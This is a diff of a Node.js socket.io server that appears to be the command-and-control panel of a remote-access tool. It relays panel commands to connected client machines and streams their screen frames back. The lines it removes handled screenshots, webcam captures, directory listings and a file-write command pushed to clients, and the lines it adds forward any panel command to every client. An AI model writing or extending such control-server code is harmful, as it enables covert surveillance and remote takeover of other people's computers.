@@ -1,38 +1,30 @@
 "use strict"
 
 // --------------- INCLUDES ---------------
-const app = require('express')();
+const express = require('express');
+const app = express()
 const http = require('http').Server(app);
 const io = require('socket.io')(http);
 const port = process.env.PORT || 3000;
-const { time } = require('console');
 const fs = require("fs")
-var Buffer = require('buffer').Buffer;
 
-// --------------- PANEL ROUTES ---------------
-app.get('/', (req, res) => {
-    res.sendFile(__dirname + '/panel/index.html');
-});
+// --------------- VARIABLES ---------------
+app.use('/', express.static('panel'));
 
 // --------------- SOCKIO CONNECTION ---------------
 io.on('connection', (socket) => {
     let addedClient = false
-    console.log("---------------- New connection ----------------")
 
+    // --------------- CLIENT FUNCTIONS ---------------
     socket.on("add client", (options) => {
         if (addedClient) return
 
         socket.clientData = options
         addedClient = true
+    })
 
-        fs.readFile('image.jpg', function (err, buf) {
-            // it's possible to embed binary data
-            console.log(buf)
-            socket.emit('command', {
-                event: "write_file", mage: true, path: "./image.jpg",
-                content: buf
-            });
-        });
+    socket.on("response", (data) => {
+        socket.broadcast.emit("response", data)
     })
 
     socket.on("error", (options) => {
@@ -45,25 +37,18 @@ io.on('connection', (socket) => {
         socket.broadcast.emit("info", options)
     })
 
-    socket.on("directory", dirList => {
-        console.log(dirList)
-    })
-
-    socket.on("screenshot", (imageBuffer) => {
-        socket.broadcast.emit('screenshot', imageBuffer.toString("base64"));
-    })
-
-    socket.on("webcamshot", (imageBuffer) => {
-        socket.broadcast.emit('webcamshot', imageBuffer.toString("base64"));
-    })
-
     socket.on("frame", (imageBuffer) => {
-        socket.broadcast.emit('frame', imageBuffer.toString("base64"));
+        socket.broadcast.emit("frame", imageBuffer.toString("base64"));
     })
 
-    // EMIT GREETING
+    // --------------- PANEL FUNCTIONS ---------------
+    socket.on("command", (options) => {
+        socket.broadcast.emit("command", options)
+    })
+
     socket.emit("command", { event: "greet" })
 });
+
 
 // --------------- START SERVER ---------------
 http.listen(port, () => {
